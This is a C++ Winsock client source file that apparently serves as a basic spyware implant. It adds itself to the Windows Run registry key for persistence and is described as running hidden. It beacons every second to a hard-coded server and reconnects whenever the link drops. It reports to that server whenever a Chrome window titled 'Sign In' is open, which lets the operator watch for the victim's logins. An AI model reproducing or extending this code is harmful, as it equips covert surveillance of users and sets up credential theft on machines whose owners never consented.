//Winsock client compat with multi thread server
//getting head
#include<windows.h>
#include <winsock2.h>
#include <windns.h>
#include <iostream>
#include <process.h>
#include <stdio.h>
#include <string>
#include <tchar.h>



using namespace std;

//-----Prototypes and global vars
TCHAR exepath[MAX_PATH]; //Persistence reg variables
HKEY hKey; //Persistence reg variables
const char pingbuffer[1] = {'*'}; // Ping server command
const char windowbuffer[1] = {'0'};
char sendbuffer[200]; //general buffer for sending to serv
WSADATA wsaData;
int iResult; //Validity switch
sockaddr_in addr;
SOCKET sock,client;
struct hostent *he; //Stupid addr struct to hold our resolved IP
struct in_addr **addr_list; //Stupid addr struct to hold our resolved IP
int i;  // Placmarker for  resolved IP struct
string hostname;
int PORT;
//--------------------------------


int main()


{

    /////////////////////////////PERSISTANCE////////////////

//Add file to startup , starts when windows starts >:D
 GetModuleFileName(0, exepath, MAX_PATH);
    LONG lnRes = RegOpenKeyEx(
           HKEY_CURRENT_USER,
           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
           0,KEY_WRITE,
           &hKey
       );
       if( ERROR_SUCCESS == lnRes )
       {
          lnRes = RegSetValueEx(hKey,
                         "PROJECTZ",
                         0,
                         REG_SZ,
                         (BYTE*) exepath,
                         _tcslen(exepath));

                         }

   /////////////////////////////PERSISTANCE////////////////


//This will be a hidden process , so we will keep verbosity low mainly for debugging
    ///________WSA Prep +Check
    addr.sin_family = AF_INET;
    iResult = WSAStartup(MAKEWORD(2,2),&wsaData);

    if(iResult){

        printf("[X]WSA Startup failure..");
        return 0;
            }
 ///____________

connect:

    ///____________DNS + PORT___(These are hard coded for now)
    addr.sin_port = htons(9900);
        //-------Resolve DNS----
            he = gethostbyname("192.168.0.15"); //
if (!he)
  { puts("[i]Host could not be resolved..");
    return 0; //try again
  }else{
  addr_list = (struct in_addr **)he->h_addr_list;

  for(i = 0; addr_list[i] != NULL; i++) { //cycle thru possible hosts
         printf("[i]Host Found:%s", inet_ntoa(*addr_list[i]));
        // addr.sin_addr.S_un.S_addr = inet_addr("192.168.0.15");
        addr.sin_addr.S_un.S_addr = inet_addr(inet_ntoa(*addr_list[i])); //SET OUR FUCKING IP TO RESOLVED DNS !
         break;
    }
  }
         //-------Resolve DNS----

 ///_________________________________________________________



///____Socket set + Check
 sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
 if(sock == INVALID_SOCKET){
        printf("[X]Invalid Socket..\n");
        return 0;

                        }
///_______

///_____Connect to server!!! Yeehaw

while(connect(sock,(SOCKADDR*)&addr,sizeof(sockaddr_in))){ //if error{
printf("Fail connect..");
}

//Ping loop .. very confusing at first glance , we always want to ping the server every second , so our commands are sent inside the ping loop!
for(;;){
      do{
       HWND hwnd = FindWindow( NULL, TEXT("Sign In - Google Chrome") ); //Set up a HWND to check if a certain window is open as per its title

      if(hwnd!=NULL) { //The window is open
            send(sock,windowbuffer,sizeof(windowbuffer),0); //Tell the server!
             printf("hotmail open");} //Verbosity for debugging

      Sleep(1000); // NO SPAM!
      }
      while(send(sock,pingbuffer,sizeof(pingbuffer),0) != SOCKET_ERROR);  // Send a ping buffer

      //we do first because we want to make sure we have the buffer ready , then we while to check if the server is up while also informing the server we are alive
 break; // if we get here , send = socket_error , meaning server down. break out of do loop and go back to connect loop if server downs
}

//If we get here it means the server down, attempt to reconnect.
goto connect;



//________________
closesocket(sock);
return 0;
}

